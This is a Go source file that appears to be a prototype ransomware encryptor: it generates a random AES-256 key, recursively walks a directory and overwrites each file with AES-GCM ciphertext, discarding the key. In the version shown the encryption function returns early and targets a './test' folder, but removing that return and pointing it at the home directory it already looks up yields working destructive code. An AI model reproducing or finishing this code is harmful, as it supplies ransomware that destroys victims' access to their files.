package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"runtime"
	"io"
	"os"
)

var key []byte
var fileSep string

func main() {

	home, _ := os.UserHomeDir()
	fmt.Println("home ", home)

	//testdir := ".\\test"
	testdir := "./test"

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}

	err := genKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	//files, err := os.ReadDir(testdir)
	//if err != nil {
	//	fmt.Println("ERROR: ", err)
	//	os.Exit(1)
	//}
	traverseFiles(testdir)
}

func genKey() error {
	key = make([]byte, 32)
	_, err := rand.Read(key)

	fmt.Println("key ", key)
	fmt.Printf("%x", key)
	return err
}

//func dirRecurse(dirname os.DirEntry, base string) {
//	files, err := os.ReadDir(base)
//	if err != nil {
//		fmt.Println(err)
//		os.Exit(1)
//	}
//	traverseFiles(files, base)
//}

func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, file := range files {
		if file.IsDir() {
			//fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
			//fmt.Println("traverseFiles read dir path: ", base + fileSep + file.Name())
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
			fmt.Println("dir path: ", base)
			//dirRecurse(file, base, fileSep)
		} else {
			//fmt.Println("traverseFiles read file path: ", base + fileSep + file.Name())
			base := path + fileSep + file.Name()
			fmt.Println("file path: ", base)
			
			fmt.Println("file to enc: ", base)
			encryptFile(base)
		}
	}
	for _, dir := range dirs {
		fmt.Println("second step dir: ", dir)
		traverseFiles(dir)
	}
}

func encryptFile(path string) {
	return
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("path ", path)
	fmt.Println("data ", data)

	
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	enc := gcm.Seal(nonce, nonce, data, nil)
	fmt.Println("enc data ", enc)
	err = os.WriteFile(path, enc, 0777)
	if err != nil {
		fmt.Println(err)
	}
}

